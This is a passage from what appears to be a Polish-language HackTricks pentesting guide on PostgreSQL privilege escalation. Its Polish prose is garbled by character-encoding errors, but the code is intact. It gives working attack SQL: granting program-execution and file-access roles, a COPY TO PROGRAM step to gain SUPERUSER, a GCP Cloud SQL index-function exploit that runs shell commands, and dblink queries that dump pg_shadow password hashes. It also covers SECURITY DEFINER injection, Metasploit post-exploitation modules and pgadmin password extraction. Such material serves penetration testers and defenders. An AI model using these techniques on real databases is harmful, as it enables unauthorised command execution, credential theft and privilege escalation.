WiÄ™c jeÅ›li masz uprawnienie **`CREATEROLE`**, moÅ¼esz przyznaÄ‡ sobie dostÄ™p do innych **rÃ³l** (ktÃ³re nie sÄ… superuÅ¼ytkownikami), co moÅ¼e daÄ‡ ci moÅ¼liwoÅ›Ä‡ odczytu i zapisu plikÃ³w oraz wykonywania poleceÅ„:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Zmiana hasÅ‚a

UÅ¼ytkownicy z tÄ… rolÄ… mogÄ… rÃ³wnieÅ¼ **zmieniaÄ‡** **hasÅ‚a** innych **nie-superuÅ¼ytkownikÃ³w**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Przywileje SUPERUSER

CzÄ™sto zdarza siÄ™, Å¼e **lokalni uÅ¼ytkownicy mogÄ… zalogowaÄ‡ siÄ™ do PostgreSQL bez podawania hasÅ‚a**. Dlatego, gdy juÅ¼ zdobÄ™dziesz **uprawnienia do wykonywania kodu**, moÅ¼esz wykorzystaÄ‡ te uprawnienia, aby uzyskaÄ‡ rolÄ™ **`SUPERUSER`**:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
{% hint style="info" %}
To jest zazwyczaj moÅ¼liwe ze wzglÄ™du na nastÄ™pujÄ…ce linie w pliku **`pg_hba.conf`**:
```bash
# "local" is for Unix domain socket connections only
local   all             all                                     trust
# IPv4 local connections:
host    all             all             127.0.0.1/32            trust
# IPv6 local connections:
host    all             all             ::1/128                 trust
```
{% endhint %}

### **ALTER TABLE privesc**

W [**tym opracowaniu**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) wyjaÅ›niono, jak byÅ‚o moÅ¼liwe **privesc** w Postgres GCP, wykorzystujÄ…c przywileje ALTER TABLE, ktÃ³re zostaÅ‚y przyznane uÅ¼ytkownikowi.

Przy prÃ³bie **ustawienia innego uÅ¼ytkownika jako wÅ‚aÅ›ciciela tabeli** powinien pojawiÄ‡ siÄ™ **bÅ‚Ä…d** uniemoÅ¼liwiajÄ…cy to, ale wyglÄ…da na to, Å¼e GCP daÅ‚o tÄ™ **opcjÄ™ uÅ¼ytkownikowi postgres, ktÃ³ry nie jest superuÅ¼ytkownikiem** w GCP:

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

ÅÄ…czÄ…c tÄ™ ideÄ™ z faktem, Å¼e gdy polecenia **INSERT/UPDATE/ANALYZE** sÄ… wykonywane na **tabeli z funkcjÄ… indeksu**, funkcja jest **wywoÅ‚ywana** jako czÄ™Å›Ä‡ polecenia z **uprawnieniami wÅ‚aÅ›ciciela tabeli**. MoÅ¼liwe jest utworzenie indeksu z funkcjÄ… i nadanie uprawnieÅ„ wÅ‚aÅ›ciciela **superuÅ¼ytkownikowi** dla tej tabeli, a nastÄ™pnie uruchomienie ANALYZE na tabeli z zÅ‚oÅ›liwÄ… funkcjÄ…, ktÃ³ra bÄ™dzie mogÅ‚a wykonywaÄ‡ polecenia, poniewaÅ¼ korzysta z uprawnieÅ„ wÅ‚aÅ›ciciela.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Wykorzystanie

1. Rozpocznij od utworzenia nowej tabeli.
2. Wstaw nieistotne treÅ›ci do tabeli, aby dostarczyÄ‡ dane dla funkcji indeksu.
3. Opracuj zÅ‚oÅ›liwÄ… funkcjÄ™ indeksu zawierajÄ…cÄ… Å‚adunek wykonania kodu, umoÅ¼liwiajÄ…cy wykonanie nieautoryzowanych poleceÅ„.
4. ZmieÅ„ wÅ‚aÅ›ciciela tabeli na "cloudsqladmin", ktÃ³ry jest rolÄ… superuÅ¼ytkownika GCP uÅ¼ywanÄ… wyÅ‚Ä…cznie przez Cloud SQL do zarzÄ…dzania i utrzymania bazy danych.
5. Wykonaj operacjÄ™ ANALYZE na tabeli. Ta czynnoÅ›Ä‡ zmusza silnik PostgreSQL do przeÅ‚Ä…czenia siÄ™ na kontekst uÅ¼ytkownika wÅ‚aÅ›ciciela tabeli, "cloudsqladmin". W rezultacie zÅ‚oÅ›liwa funkcja indeksu jest wywoÅ‚ywana z uprawnieniami "cloudsqladmin", umoÅ¼liwiajÄ…c wykonanie wczeÅ›niej nieautoryzowanego polecenia powÅ‚oki.

W PostgreSQL ten proces wyglÄ…da mniej wiÄ™cej tak:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
NastÄ™pnie tabela `shell_commands_results` bÄ™dzie zawieraÄ‡ wynik wykonanego kodu:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalne logowanie

NiektÃ³re Åºle skonfigurowane instancje postgresql mogÄ… umoÅ¼liwiaÄ‡ logowanie dowolnego lokalnego uÅ¼ytkownika. MoÅ¼liwe jest lokalne logowanie z adresu 127.0.0.1 przy uÅ¼yciu funkcji **`dblink`**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e dla poprzedniego zapytania **funkcja `dblink` musi istnieÄ‡**. JeÅ›li jej nie ma, moÅ¼na sprÃ³bowaÄ‡ jÄ… utworzyÄ‡ za pomocÄ…
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

JeÅ›li masz hasÅ‚o uÅ¼ytkownika o wiÄ™kszych uprawnieniach, ale uÅ¼ytkownik nie moÅ¼e logowaÄ‡ siÄ™ z zewnÄ™trznego adresu IP, moÅ¼esz uÅ¼yÄ‡ nastÄ™pujÄ…cej funkcji do wykonywania zapytaÅ„ jako ten uÅ¼ytkownik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
MoÅ¼liwe jest sprawdzenie, czy ta funkcja istnieje za pomocÄ…:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Niestandardowa zdefiniowana funkcja z** SECURITY DEFINER

[W tym opracowaniu](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesterzy byli w stanie uzyskaÄ‡ podwyÅ¼szenie uprawnieÅ„ w instancji postgres dostarczonej przez IBM, poniewaÅ¼ **znaleÅºli tÄ™ funkcjÄ™ z flagÄ… SECURITY DEFINER**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
â€¦
</code></pre>

Jak [wyjaÅ›niono w dokumentacji](https://www.postgresql.org/docs/current/sql-createfunction.html), funkcja z **SECURITY DEFINER jest wykonywana** z uprawnieniami **uÅ¼ytkownika, ktÃ³ry jÄ… posiada**. Dlatego, jeÅ›li funkcja jest **podatna na SQL Injection** lub wykonuje **przywilejowane dziaÅ‚ania z parametrami kontrolowanymi przez atakujÄ…cego**, moÅ¼e byÄ‡ wykorzystana do **podwyÅ¼szenia uprawnieÅ„ wewnÄ…trz postgres**.

W linii 4 poprzedniego kodu moÅ¼na zobaczyÄ‡, Å¼e funkcja ma flagÄ™ **SECURITY DEFINER**.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
A nastÄ™pnie **wykonaj polecenia**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### Przechodzenie siÅ‚owe z uÅ¼yciem PL/pgSQL

**PL/pgSQL** to **w peÅ‚ni funkcjonalny jÄ™zyk programowania**, ktÃ³ry oferuje wiÄ™kszÄ… kontrolÄ™ proceduralnÄ… w porÃ³wnaniu do SQL. UmoÅ¼liwia korzystanie z **pÄ™tli** i innych **struktur kontrolnych** w celu ulepszenia logiki programu. Ponadto, **polecenia SQL** i **wyzwalacze** majÄ… moÅ¼liwoÅ›Ä‡ wywoÅ‚ywania funkcji, ktÃ³re sÄ… tworzone przy uÅ¼yciu jÄ™zyka **PL/pgSQL**. Ta integracja pozwala na bardziej wszechstronne i elastyczne podejÅ›cie do programowania i automatyzacji bazy danych.\
**MoÅ¼esz wykorzystaÄ‡ ten jÄ™zyk, aby poprosiÄ‡ PostgreSQL o przeprowadzenie ataku siÅ‚owego na dane uwierzytelniajÄ…ce uÅ¼ytkownikÃ³w.**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### logowanie

W pliku _**postgresql.conf**_ moÅ¼na wÅ‚Ä…czyÄ‡ logowanie postgresql, zmieniajÄ…c:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
NastÄ™pnie, **zrestartuj usÅ‚ugÄ™**.

### pgadmin

[pgadmin](https://www.pgadmin.org) to platforma do administracji i rozwoju PostgreSQL.\
HasÅ‚a moÅ¼na znaleÅºÄ‡ w pliku _**pgadmin4.db**_.\
MoÅ¼na je odszyfrowaÄ‡ za pomocÄ… funkcji _**decrypt**_ w skrypcie: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

Autoryzacja klienta w PostgreSQL jest zarzÄ…dzana za pomocÄ… pliku konfiguracyjnego o nazwie **pg_hba.conf**. Ten plik zawiera seriÄ™ rekordÃ³w, z ktÃ³rych kaÅ¼dy okreÅ›la typ poÅ‚Ä…czenia, zakres adresÃ³w IP klienta (jeÅ›li dotyczy), nazwÄ™ bazy danych, nazwÄ™ uÅ¼ytkownika i metodÄ™ uwierzytelniania do uÅ¼ycia przy dopasowywaniu poÅ‚Ä…czeÅ„. Pierwszy rekord, ktÃ³ry pasuje do typu poÅ‚Ä…czenia, adresu klienta, Å¼Ä…danej bazy danych i nazwy uÅ¼ytkownika, jest uÅ¼ywany do uwierzytelniania. JeÅ›li nie ma pasujÄ…cego rekordu, dostÄ™p jest odrzucany.

DostÄ™pne metody uwierzytelniania oparte na haÅ›le w pliku pg_hba.conf to **md5**, **crypt** i **password**. Metody te rÃ³Å¼niÄ… siÄ™ sposobem przesyÅ‚ania hasÅ‚a: skrÃ³tem MD5, zaszyfrowaniem kryptograficznym lub tekstem jawnym. WaÅ¼ne jest zauwaÅ¼enie, Å¼e metoda crypt nie moÅ¼e byÄ‡ uÅ¼ywana z hasÅ‚ami, ktÃ³re zostaÅ‚y zaszyfrowane w pg_authid.

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ **reklamÄ™ swojej firmy w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi trikami hakerskimi, przesyÅ‚ajÄ…c PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
UÅ¼yj [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), aby Å‚atwo tworzyÄ‡ i **automatyzowaÄ‡ zadania** przy uÅ¼yciu najbardziej zaawansowanych narzÄ™dzi spoÅ‚ecznoÅ›ciowych na Å›wiecie.\
Otrzymaj dostÄ™p juÅ¼ dziÅ›:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
